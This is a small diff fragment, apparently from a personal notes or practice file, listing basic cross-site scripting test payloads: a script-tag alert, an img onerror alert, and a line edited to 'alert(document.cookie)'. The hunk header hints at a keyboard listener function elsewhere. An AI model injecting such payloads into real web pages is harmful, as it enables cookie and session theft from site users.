@@ -38,7 +38,7 @@ with Listener(on_press=on_press)as listener:
 crack station
 r
 <script>alert("hiiii guys")</script>
-<script>document.cookie</script>
+alert(document.cookie)
 <img src=”nosrc” onerror=”alert(“HELLO”)”/>
 
 `);
